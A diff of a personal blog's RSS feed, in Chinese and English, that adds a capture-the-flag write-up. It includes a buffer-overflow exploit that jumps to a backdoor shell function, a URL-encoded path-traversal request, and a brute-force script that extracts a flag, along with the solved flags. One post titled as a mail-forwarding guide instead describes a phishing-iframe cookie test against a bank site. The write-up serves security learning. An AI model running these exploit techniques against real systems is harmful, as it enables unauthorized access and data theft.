+&lt;span class=&#34;n&#34;&gt;backdoor_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x4011dd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;backdoor_address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#0x4011dd -&amp;gt; function: debug() -&amp;gt; get webshell: system(&amp;#34;sh&amp;#34;) -&amp;gt; grep -r FLAG{&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# FLAG{d1d_y0u_ju5t_s4y_w1nd0w5?}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;web---api-leak&#34;&gt;Web - API leak&lt;/h2&gt;
+&lt;p&gt;題目公布的前後端的程式碼幾乎就包含所有線索了，原本想說先用 nmap recon 一下去戳看看有沒有隱藏的 service，也用字典檔找隱藏 endpoint，但毫無所獲，乖乖看懂程式碼然後解題吧。&lt;/p&gt;
+&lt;p&gt;👉 &lt;a class=&#34;link&#34; href=&#34;http://splitline.tw:5000/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://splitline.tw:5000/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;使用工具:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;recon: nmap&lt;/li&gt;
+&lt;li&gt;exploit: F12、postman、python-requests&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;API flow &amp;amp; my attack flow&lt;/strong&gt;
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 110; 
+			flex-basis: 265px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-api-flow.png&#34; data-size=&#34;1041x940&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-api-flow.png&#34;
+			width=&#34;1041&#34;
+			height=&#34;940&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/img-api-flow_hu735d7e8944c77f5da69747627ac95081_177158_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-api-flow_hu735d7e8944c77f5da69747627ac95081_177158_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Found unused local endpoint&lt;/strong&gt; &lt;em&gt;/looksLikeFlag&lt;/em&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在網頁正常使用下我們都不會呼叫 &amp;ldquo;/looksLikeFlag&amp;rdquo; 這個 api endpoint，仔細看一下後端 express 這兩個 endpoint&amp;rsquo;s url，如果我們能透過 text 變數回到上一層就可以戳到 /looksLikeFlag 了:
+&lt;ul&gt;
+&lt;li&gt;http://127.0.0.1:7414/api/v1/emoji/${text}&lt;/li&gt;
+&lt;li&gt;http://127.0.0.1:7414/api/v1/looksLikeFlag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;一般而言我們不可能，因為 api 格式就是固定的，但題目故意開一個漏洞讓我們可以由 &lt;code&gt;../&lt;/code&gt; 返回上一層。注意要做 url encoding 規避掉 regex 的 &lt;code&gt;.&lt;/code&gt; 句號檢查。(其實我第一個想到的漏洞是LFI，但這題環境是 nodeJS 不是 php，&lt;code&gt;?file=&lt;/code&gt;這個參數他不收) 
+&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 185; 
+			flex-basis: 445px&#34;
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-postman.png&#34; data-size=&#34;1182x637&#34;&gt;
+		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-postman.png&#34;
+			width=&#34;1182&#34;
+			height=&#34;637&#34;
+			srcset=&#34;https://weberlu88.github.io/p/hw0/img-postman_huad93f68fb4b2ce287b272fee6f115870_50434_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-postman_huad93f68fb4b2ce287b272fee6f115870_50434_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Found response body contain a looksLikeFlag parameter, can &lt;em&gt;brutefource&lt;/em&gt; to retrieve flag digit by digit.&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;FLAG&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./secret.js&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;apiRouter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;use&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/looksLikeFlag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;c1&#34;&gt;// 小提示: 照理來說assert只會出現在 unit test 中，暗示 FLAG 只包含這些字元。
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;assert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;FLAG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/^FLAG{[a-z0-9_]+}$/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt; 
+    &lt;span class=&#34;c1&#34;&gt;// includes() 會核對API參數和真實的FLAG，只會回傳 true / false。
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;looksLikeFlag&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;FLAG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;includes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最終程式碼:&lt;br&gt;
+✅ 小技巧: 善用 string.digits 以及 string.ascii_lowercase。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 0
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Exploit the flag regex with brut-force requests&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# request body: &lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#   {&amp;#34;text&amp;#34;: &amp;#34;%2E%2E/looksLikeFlag?flag=FLAG{xxxx}&amp;#34;}&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#   FLAG{xxxx} is the flag&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#   We need to find out string xxxx&lt;/span&gt;
+
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://splitline.tw:5000/public_api&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;exploitEndpoint&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%2E%2E&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/looksLikeFlag&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# goback to the other endpoint: ../looksLikeFlag&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# store the flag with a list&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# a-z 0-9 _ }&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;digits&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; \
+         &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# examine the flag digit by digit&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;digits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exploitEndpoint&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;?flag=FLAG&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;{{&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;looksLikeFlag&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;
+            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
+
+&lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;FLAG&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;{{&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;## FLAG{3asy_p4th_tr4vers4l}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>個人理財的４個觀念</title>
         <link>https://weberlu88.github.io/p/4-principle-toward-savings/</link>
         <pubDate>Wed, 06 Oct 2021 00:00:00 +0000</pubDate>
@@ -226,6 +972,56 @@
 &lt;p&gt;最後要提醒的是，職場新鮮人應避免做出會影響理財計劃的事，參考李勛與懶錢包團隊的經驗，應先衡量個人收支及還款能力，再執行大額支出的消費，例如買車。此外，申辦信用卡消費能獲得現金、點數回饋，替荷包省下一筆錢，不過，若是選擇每月帳單只繳最低金額，須負擔循環利息，不僅增加還款壓力，更可能造成信用瑕疵，影響日後申貸成功的機率。&lt;/p&gt;
 &lt;p&gt;此外，任何投資都具有風險，沒有保證獲利而不會虧損的工具，近期許多不肖人士以電話、簡訊、通訊軟體等方式，向投資人遊說「獲利100%、穩賺不賠」的投資方式，假如投資人輕信，可能求償無門，更讓積蓄付之一炬。&lt;/p&gt;
 &lt;p&gt;王道銀行存匯支付部資深協理徐佩琳表示，即使是合法的投資工具，想要獲得高報酬，勢必承受高風險，建議年輕族群不以融資、融券等槓桿方式操作，或是接觸不熟悉的個股當沖、期貨等交易，除了影響上班思緒，一旦操作不慎，會讓本金有去無回，進而肩負沉重債務，反而讓理財計劃窒礙難行。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>NTU Mail 綁定轉發/寄信功能到 Gmail 上</title>
+        <link>https://weberlu88.github.io/p/ntu-mail-bind-google/</link>
+        <pubDate>Mon, 20 Sep 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://weberlu88.github.io/p/ntu-mail-bind-google/</guid>
+        <description>&lt;h2 id=&#34;背景知識&#34;&gt;背景知識&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie/SameSite&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie/SameSite&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.youtube.com/watch?v=GPz7onXjP_4&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.youtube.com/watch?v=GPz7onXjP_4&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	&gt;
+	&lt;a href=&#34;https://weberlu88.github.io/img-set-cookie.png&#34; &gt;
+		&lt;img src=&#34;https://weberlu88.github.io/img-set-cookie.png&#34;
+			
+			
+			
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;實測結論&#34;&gt;實測結論&lt;/h2&gt;
+&lt;p&gt;不行! 後端無法透過 request 取得 iframe 內嵌銀行網頁的 cookie。&lt;/p&gt;
+&lt;p&gt;下圖中可以看到兩個不同網域的 cookie，我們建在本機的釣魚網站是 https://127.0.0.1:5000，網路銀行的網站則是 &lt;a class=&#34;link&#34; href=&#34;https://www.digistarbank.com.tw&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.digistarbank.com.tw&lt;/a&gt; (iframe)，因為還未登入所以只有兩個 cookie (language、sessionId)，他們在 firefox 瀏覽器的屬性為:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;samesite = None (在 chrome 中則是空白，因為銀行網站沒有主動設定所以連 none 都沒有)&lt;/li&gt;
+&lt;li&gt;secure = false (同上)&lt;/li&gt;
+&lt;li&gt;httpOnly = true (在 chrome 中同為 true)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;發現和釋疑&#34;&gt;發現和釋疑&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;我以為 cookie 中的 secure 屬性只要該網站是 https 就會被添加上去，事實上不是，需要特別由 set-cookie 設置。可參考背景知識中 set-cookie 的連結。
+&lt;ul&gt;
+&lt;li&gt;疑點: 若第三方網頁允許第三方 cookie，Secure attribute 是要設置在第三方網頁上嗎?&lt;/li&gt;
+&lt;li&gt;疑點: 若第三方網頁允許第三方 cookie，Samesite attribute 是要設置在第三方網頁上嗎?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;httpOnly 會禁止 JS 傳送和存取 cookie? 所以數位星辰銀行不論在前後端都無法 accesss 自己設置的 cookie?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;其他成功取得第三方-cookie-的案例&#34;&gt;其他成功取得第三方 cookie 的案例&lt;/h2&gt;
+&lt;p&gt;要不要找個允許第三方cookie的網頁來實測一下第三方cookie到底是如何運作的? 引用現成的教學文也可。&lt;/p&gt;
 </description>
         </item>
         <item>
